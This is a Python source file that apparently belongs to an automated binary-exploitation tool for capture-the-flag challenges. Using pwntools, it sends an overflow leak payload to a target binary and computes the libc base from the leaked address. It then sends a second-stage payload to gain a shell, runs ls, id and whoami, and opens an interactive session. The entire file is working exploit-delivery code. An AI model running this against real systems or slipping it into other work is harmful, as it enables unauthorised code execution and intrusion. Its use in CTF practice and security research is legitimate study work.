from pwn import remote, process, u64, u32, ELF, gdb
import re
from .overflowExploiter import exploitOverflow
import logging

log = logging.getLogger(__name__)

def sendExploit(binary_name,properties,user_input=None,debug=False):
    send_results = {}
    proc = process(binary_name)
    if debug:
        gdb.attach(
        proc,
        """
        b *0x4006b0
        c
        """,
        )
    if user_input is None:
        user_input = properties["overflow"]["results"]["input"]
    # print(properties["overflow"]["results"]["type"])
    if properties["overflow"]["results"]["type"] == "leak":
        leak_input = properties["overflow"]["results"]["leak_input"]
        leak_output = properties["overflow"]["results"]["leak_output"]
        leaked_function = properties["overflow"]["results"]["leaked_function"]
        output_len = len(leak_output)

        proc.clean_and_log(timeout=1)

        if leak_input.endswith(b"\n"):
            proc.send(leak_input)
        else:
            proc.sendline(leak_input)

        bytes_with_leak = proc.recvuntil(b"\n").replace(b"\n", b"")

        log.info("Second clean and log")
        proc.clean_and_log()

        # bytes_with_leak = proc.read()
        if properties["protections"]["arch"] == "amd64":
            total_leak = bytes_with_leak.ljust(8, b"\x00")
            leaked_val = u64(total_leak)  # puts won't print null bytes
        else:
            total_leak = bytes_with_leak.ljust(4, b"\x00")
            leaked_val = u32(total_leak)  # puts won't print null bytes

        log.info("--- Leak ---")
        log.info(total_leak)
        log.info(bytes_with_leak)

        log.info("leak is {}".format(hex(leaked_val)))
        log.info(
            "leaked function {} found at {}".format(leaked_function, hex(leaked_val))
        )
        properties["overflow"]["results"]["leaked_function_address"] = leaked_val

        if properties.get("libc", None):
            if isinstance(properties["libc"], dict):
                remote_libc = properties["libc"]["remote_libc"][0]
                leaked_function_offset = int(
                    remote_libc["symbols"][leaked_function], 16
                )
                properties["libc_base_address"] = leaked_val - leaked_function_offset
            else:
                libc = ELF(properties["libc"])
                properties["libc_base_address"] = (
                    leaked_val - libc.symbols[leaked_function]
                )

            log.info(
                "[+] Leak sets libc address to {}".format(
                    hex(properties["libc_base_address"])
                )
            )

        # Make second stage pwn
        properties["overflow"]["results"] = exploitOverflow(
            binary_name, properties, inputType=properties["input_type"]
        )

        second_stage_input = properties["overflow"]["results"]["input"]
        try:
            proc.sendline(second_stage_input)
        except EOFError:
            log.error("Got EOF error")
            return None

    else:
        proc.sendline(user_input)

    # If we have a shell, send some commands!
    proc.sendline()
    proc.sendline(b"ls;\n")
    proc.sendline(b"id\n")
    proc.sendline(b"whoami\n")
    # Sometimes the flag is just printed
    results = proc.recvall()
    log.debug(results)
    print(results)
    proc.interactive()

    return send_results